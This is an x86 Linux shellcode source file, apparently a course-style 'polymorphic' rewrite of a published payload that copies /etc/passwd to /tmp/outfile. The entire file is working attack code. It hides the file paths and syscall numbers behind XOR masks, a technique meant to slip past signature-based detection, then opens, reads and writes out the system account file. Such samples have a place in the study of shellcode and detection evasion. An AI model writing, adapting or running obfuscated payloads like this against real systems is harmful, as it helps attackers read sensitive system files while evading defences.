/*

Polymorphic version of #Author:        Paolo Stivanin
<https://github.com/polslinux>, "Copy /etc/passwd to /tmp/outfile (97 bytes)"

adp, 2018

*/

.global _start
.text

.macro XOR_MASK VAL 
    movl $\VAL, %edx
    xorl %ebx, %edx
    pushl %edx
.endm

_start: 

/* sys_open	0x05	const char __user *filename	int flags	int mode  */
	
    xorl %ecx,%ecx
    mul %ecx


    movb $0x26,%al
    xorb $0x23,%al

    pushl %ecx

    movl $0x2363ab35, %ebx
    
    XOR_MASK 0x4714d846
    XOR_MASK 0x42138456
    XOR_MASK 0x5706841a

    movl %esp, %ebx

    int $0x80

/* 	sys_read	0x03	unsigned int fd	char __user *buf	size_t count */


    movl %eax,%ebx

    movb $0xed,%al
    xorb $0xee,%al
 
    movl %esp,%edi
    movl %edi,%ecx

    movw $0xffff, %dx
    int $0x80


/* 	sys_open	0x05	const char __user *filename	int flags	int mode */

    movl %eax,%esi

    xorl %eax, %eax
    movb $0xa9, %al
    xorb $0xac, %al 

    xorl %ecx,%ecx
    pushl %ecx

    movl $0x2363ab35, %ebx
    
    XOR_MASK 0x460fc253
    XOR_MASK 0x5716c41a
    XOR_MASK 0x530edf1a

    movl %esp,%ebx
    movb $0x42, %cl #102
    pushw $0x1a4
    popw %dx
    int $0x80

    movl %eax,%ebx

    xorl %eax, %eax
    movb $0xbb, %al
    xorb $0xbf, %al
    movl %edi,%ecx
    movl %esi,%edx
    int $0x80


    xorl %eax,%eax
    xorl %ebx,%ebx

    movb $0x67,%al
    xorb $0x66, %al
    movb $0x5,%bl
    int $0x80






